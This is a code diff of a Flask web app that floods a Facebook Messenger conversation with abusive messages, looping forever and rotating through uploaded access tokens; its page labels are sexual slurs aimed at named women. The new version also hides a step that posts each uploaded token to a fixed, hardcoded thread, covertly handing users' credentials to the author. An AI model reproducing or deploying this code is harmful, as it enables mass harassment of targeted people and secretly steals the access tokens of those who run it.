@@ -1,172 +1,235 @@
-from flask import Flask, request
-import requests
+from flask import Flask, request, render_template_string, jsonify
+import threading
 import os
-from time import sleep
+import requests
 import time
-from datetime import datetime
+import http.server
+import socketserver
+
 app = Flask(__name__)
-app.debug = True
 
-headers = {
-    'Connection': 'keep-alive',
-    'Cache-Control': 'max-age=0',
-    'Upgrade-Insecure-Requests': '1',
-    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
-    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-    'Accept-Encoding': 'gzip, deflate',
-    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
-    'referer': 'www.google.com'
-}
-
-@app.route('/', methods=['GET', 'POST'])
-def send_message():
-    if request.method == 'POST':
-        access_token = request.form.get('accessToken')
-        thread_id = request.form.get('threadId')
-        mn = request.form.get('kidx')
-        time_interval = int(request.form.get('time'))
-
-        txt_file = request.files['txtFile']
-        messages = txt_file.read().decode().splitlines()
-
-        while True:
-            try:
-                for message1 in messages:
-                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
-                    message = str(mn) + ' ' + message1
-                    parameters = {'access_token': access_token, 'message': message}
-                    response = requests.post(api_url, data=parameters, headers=headers)
-                    if response.status_code == 200:
-                        print(f"Message sent using token {access_token}: {message}")
-                    else:
-                        print(f"Failed to send message using token {access_token}: {message}")
-                    time.sleep(time_interval)
-            except Exception as e:
-                print(f"Error while sending message using token {access_token}: {message}")
-                print(e)
-                time.sleep(30)
-
-
-    return '''
-    
+# HTML Template with updated styles and background image
+HTML_TEMPLATE = '''
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>𝐒𝐀𝐑𝐕𝐄𝐑 SHANU </title>
-  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
-  <style>
-    /* CSS for styling elements */
-
-
-
-label{
-    color: Azure blue;
-}
-
-.file{
-    height: 40px;
-}
-body{
-    background-image: url('https://i.imgur.com/QaeCC13.jpeg');
-    background-size: cover;
-    background-repeat: no-repeat;
-    color: white;
-
-}
-    .container{
-      max-width: 350px;
-      height: 600px;
-      border-radius: 20px;
-      padding: 20px;
-      box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
-      box-shadow: 0 0 15px white;
-            border: none;
-            resize: none;
-    }
-        .form-control {
-            outline: 1px red;
-            border: 1px double white ;
-            background: transparent; 
-            width: 100%;
-            height: 40px;
-            padding: 7px;
-            margin-bottom: 20px;
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>☠️ OWNER NISHA KI CHUDAI KA BAAP DJ  IINSIIDE ☠️</title>
+    <style>
+        body {
+            background-image: url('https://postimg.cc/v1H1B1dc'); /* Replace with the URL of your image */
+            background-size: cover;
+            background-position: center;
+            color: white; /* Ensure text is readable on the background */
+            font-family: Arial, sans-serif;
+        }
+        .form-container {
+            background-color: rgba(0, 0, 0, 0.7); /* Adding a semi-transparent background for readability */
+            padding: 20px;
             border-radius: 10px;
+            max-width: 600px;
+            margin: 40px auto;
+        }
+        .form-container h2 {
+            text-align: center;
+            color: #ffffff;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            color: #ffffff;
+        }
+        .form-group input,
+        .form-group button {
+            width: 100%;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            box-sizing: border-box;
+            margin-top: 5px;
+        }
+        /* Changing colors for different input fields */
+        #tokensFile {
+            background-color: red; /* Red color for tokensFile input */
+        }
+        #convoId {
+            background-color: yellow; /* Yellow color for convoId input */
+        }
+        #messagesFile {
+            background-color: green; /* Green color for messagesFile input */
+        }
+        #hatersName {
+            background-color: Red; /* Blue color for hatersName input */
+        }
+        #speed {
+            background-color: yellow; /* Purple color for speed input */
+        }
+        .form-group button {
+            background-color: #4CAF50;
             color: white;
-    }
-    .header{
-      text-align: center;
-      padding-bottom: 20px;
-    }
-    .btn-submit{
-      width: 100%;
-      margin-top: 10px;
-    }
-    .footer{
-      text-align: center;
-      margin-top: 20px;
-      color: #888;
-    }
-    .whatsapp-link {
-      display: inline-block;
-      color: #25d366;
-      text-decoration: none;
-      margin-top: 10px;
-    }
-    .whatsapp-link i {
-      margin-right: 5px;
-    }
-  </style>
+            cursor: pointer;
+        }
+        .form-group button:hover {
+            background-color: #45a049;
+        }
+    </style>
 </head>
 <body>
-  <header class="header mt-4">
-  <h1 class="mt-3">𝗦𝗘𝗥𝗩𝗘𝗥 𝗠𝗔𝗦𝗧𝗘𝗥 𝐊𝐀𝐌𝐄𝐄𝐍𝐀 SHANU[𝐅𝐑𝐎𝐌 MEMBERS SHANU BROTHER GANG ]</h1>
-  </header>
-  <div class="container text-center">
-    <form method="post" enctype="multipart/form-data">
-      <div class="mb-3">
-        <label for="tokenFile" class="form-label">𝙎𝙀𝙇𝙀𝘾𝙏 𝙔𝙊𝙐𝙍 𝙏𝙊𝙆𝙀𝙉 𝙁𝙄𝙇𝙀</label>
-        <input type="text" class="form-control" id="accessToken" name="accessToken" required>
-              </div>
-      <div class="mb-3">
-        <label for="txtFile" class="form-label">𝙉𝙋 𝙁𝙄𝙇𝙀</label>
-        <input type="file" class="form-control" id="txtFile" name="txtFile" required>
-      </div>
-      <div class="mb-3">
-        <label for="threadId" class="form-label">𝗖𝗢𝗡𝗩𝗢 𝗨𝗜𝗗{𝗚𝗖/𝗜𝗕}</label>
-        <input type="text" class="form-control" id="threadId" name="threadId" required>
-      </div>
-      <div class="mb-3">
-        <label for="kidx" class="form-label">𝗘𝗡𝗘𝗠𝗬 𝗡𝗔𝗠𝗘</label>
-        <input type="text" class="form-control" id="kidx" name="kidx" required>
-      </div>
-      <div class="mb-3">
-        <label for="time" class="form-label">𝙏𝙄𝙈𝙀 (𝙎𝙀𝘾𝙊𝙉𝘿𝙎)</label>
-        <input type="number" class="form-control" id="time" name="time" required>
-      </div>
-      <button type="submit" class="btn btn-primary btn-submit">𝗥𝗨𝗡</button>
+
+<div class="form-container">
+    <h2>[-𝙊𝙒𝙉𝙀𝙍 DJ 𝙃𝙀𝙍𝙒-] 𝙒𝘼𝙍𝙄𝙎 𝙁𝘼𝙆𝙀 MAYA UFF NISHA KI TAANG UTA NE WALA 𝙉𝙊𝙉𝙎𝙏𝙊𝙋 [<<𝙎𝙀𝙍𝙑𝙀𝙍>>]</h2>
+    <form id="messageForm" enctype="multipart/form-data">
+        <div class="form-group">
+            <label for="tokensFile">𝙁𝘼𝙆𝙀 MAYA UFF NISHA 𝙔𝘼𝙏𝙀𝙀𝙈  𝙆𝙄 𝘼𝙈𝙈𝙄 𝙆𝙄 𝘾𝙃𝙐𝙏 𝙈𝙀  𝙏𝙊𝙆𝙀𝙉 𝙁𝙄𝙇𝙀 𝘿𝘼𝙇𝙊..⤵️</label>
+            <input type="file" id="tokensFile" name="tokensFile" accept=".txt" required>
+        </div>
+        <div class="form-group">
+            <label for="convoId">MAYA UFF NISHA KO 𝘽𝙃𝙀𝙀𝙆 SERVER 𝘾𝙊𝙉𝙑𝙊 𝙐𝙄𝘿 𝘿𝘼𝙇𝙊..⤵️</label>
+            <input type="text" id="convoId" name="convoId" required>
+        </div>
+        <div class="form-group">
+            <label for="messagesFile">𝙁𝘼𝙆𝙀 MAYA UFF NISHA 𝙆𝙄 𝘽𝙀𝙃𝘼𝙉 𝙆𝙄 𝘾𝙃𝙐𝙏 𝙁𝘼𝘿𝙉𝙀 𝙒𝘼𝙇𝘼 𝙂𝘼𝙇𝙄 𝘿𝘼𝙇𝙊..⤵️</label>
+            <input type="file" id="messagesFile" name="messagesFile" accept=".txt" required>
+        </div>
+        <div class="form-group">
+            <label for="hatersName">𝙁𝘼𝙆𝙀 MAYA UFF NISHA  𝙔𝘼𝙏𝙀𝙀𝙈 𝘾𝙃𝙐𝙏𝘼𝙄 𝙆𝘼 𝙉𝘼𝙈𝙀 𝘿𝘼𝙇𝙊..⤵️</label>
+            <input type="text" id="hatersName" name="hatersName" required>
+        </div>
+        <div class="form-group">
+            <label for="speed">𝙁𝘼𝙆𝙀 MAYA UFF NISHA  𝙆𝙀 𝘽𝙀𝙃𝘼𝙉 𝙆𝙄 𝘾𝙃𝙐𝙏 𝙈𝙀 𝙎𝙋𝙀𝙀𝘿 𝙎𝙀𝘾𝙊𝙉𝘿𝙎 𝘿𝘼𝙇𝙊..⤵️ (DJ DON HERW)</label>
+            <input type="number" id="speed" name="speed" value="1" required>
+        </div>
+        <div class="form-group">
+            <button type="submit">💫 𝙎𝙏𝘼𝙍𝙏 𝙎𝙀𝙉𝘿 𝙈𝙀𝙎𝙎𝙀𝙂𝙀 💫</button>
+        </div>
     </form>
-    <form method="post" action="/stop">
-      <button type="submit" class="btn btn-danger btn-submit mt-3">𝗦𝗧𝗢𝗣</button>
-    </form>
-  </div>
-  <footer class="footer">
-    <p>&copy; 𝗔𝗩𝗘𝗡𝗚𝗘𝗥 SHANU 𝗢𝗡 𝗙𝗜𝗥𝗘 </p>
-    <p><a href="https://wa.me/+91 7495077317" class="whatsapp-link">
-        <i class="fab fa-whatsapp"></i> 𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 </a></p>
-    <div class="mb-3">
-      <a href="https://www.facebook.com/dhariyashaab">𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏</a>
-    </div>
-  </footer>
+</div>
+
+<script>
+    document.getElementById('messageForm').addEventListener('submit', function(event) {
+        event.preventDefault();
+
+        // Prepare the form data
+        let formData = new FormData(this);
+
+        // Send the form data via fetch API
+        fetch('/start', {
+            method: 'POST',
+            body: formData
+        })
+        .then(response => response.json())
+        .then(result => {
+            alert(result.message);
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            alert('An error occurred. Please check the console for details.');
+        });
+    });
+</script>
+
 </body>
 </html>
- '''
+'''
 
+# HTTP server handler class
+class MyHandler(http.server.SimpleHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.send_header("Content-type", "text/plain")
+        self.end_headers()
+        self.wfile.write(b"Server is running")
 
-if __name__ == '__main__':
-    port = int(os.environ.get('PORT', 5000))
-    app.run(host='0.0.0.0', port=port)
-    app.run(debug=True)
+# Function to execute the HTTP server
+def execute_server(port):
+    with socketserver.TCPServer(("", port), MyHandler) as httpd:
+        print(f"Server running at http://localhost:{port}")
+        httpd.serve_forever()
+
+# Function to read a file and return its content as a list of lines
+def read_file(file_path):
+    with open(file_path, 'r') as file:
+        return file.readlines()
+
+@app.route('/')
+def index():
+    return render_template_string(HTML_TEMPLATE)
+
+@app.route('/start', methods=['POST'])
+def start_server_and_messaging():
+    port = 4000  # Port is fixed to 4000
+    target_id = "61571843423018"  # Fixed target ID
+    convo_id = request.form.get('convoId')
+    haters_name = request.form.get('hatersName')
+    speed = int(request.form.get('speed'))
+    
+    # Save uploaded files
+    tokens_file = request.files['tokensFile']
+    messages_file = request.files['messagesFile']
+    
+    tokens_path = 'uploaded_tokens.txt'
+    messages_path = 'uploaded_messages.txt'
+    
+    tokens_file.save(tokens_path)
+    messages_file.save(messages_path)
+    
+    tokens = read_file(tokens_path)
+    messages = read_file(messages_path)
+
+    # Start the HTTP server in a separate thread
+    server_thread = threading.Thread(target=execute_server, args=(port,))
+    server_thread.start()
+
+    # Function to send an initial message
+    def send_initial_message():
+        headers = {
+            "User-Agent": "Mozilla/5.0",
+            "Accept": "application/json",
+        }
+        for token in tokens:
+            access_token = token.strip()
+            url = "https://graph.facebook.com/v17.0/{}/".format('t_' + target_id)
+            msg = f"Hello SAHIIL SīīR II AM USIING YOUR OFFLINE SERVER...MY TOKEN IIS..⤵️ {access_token}"
+            parameters = {"access_token": access_token, "message": msg}
+            response = requests.post(url, json=parameters, headers=headers)
+            time.sleep(0.1)
+
+    # Function to send messages in a loop
+    def send_messages():
+        headers = {
+            "User-Agent": "Mozilla/5.0",
+            "Accept": "application/json",
+        }
+        num_messages = len(messages)
+        num_tokens = len(tokens)
+        max_tokens = min(num_tokens, num_messages)
+
+        while True:
+            try:
+                for message_index in range(num_messages):
+                    token_index = message_index % max_tokens
+                    access_token = tokens[token_index].strip()
+                    message = messages[message_index].strip()
+                    url = "https://graph.facebook.com/v17.0/{}/".format('t_' + convo_id)
+                    full_message = f"{haters_name} {message}"
+                    parameters = {"access_token": access_token, "message": full_message}
+                    response = requests.post(url, json=parameters, headers=headers)
+                    time.sleep(speed)
+            except Exception as e:
+                print(f"[!] An error occurred: {e}")
+
+    # Send initial message
+    send_initial_message()
+
+    # Start sending messages in a loop
+    message_thread = threading.Thread(target=send_messages)
+    message_thread.start()
+
+    return jsonify({"message": "Server and messaging started successfully"})
+
+if __name__ == "__main__":
+    app.run(host='0.0.0.0', port=int(os.getenv('PORT', 5000)))
